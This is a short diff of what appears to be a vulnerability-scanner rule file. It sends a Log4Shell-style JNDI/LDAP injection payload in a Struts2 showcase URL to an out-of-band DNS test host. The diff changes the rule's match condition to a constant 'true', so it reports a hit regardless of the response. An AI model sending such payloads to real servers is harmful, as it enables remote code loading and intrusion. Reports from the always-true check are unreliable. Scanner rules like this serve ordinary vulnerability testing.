@@ -14,7 +14,7 @@ rules:
     request:
       method: GET
       path: /struts2-showcase/$%7Bjndi:ldap://{{dnstest}}/tea%7D/
-    expression: response.status >= 200
+    expression: "true"
   r2:
     request:
       method: GET
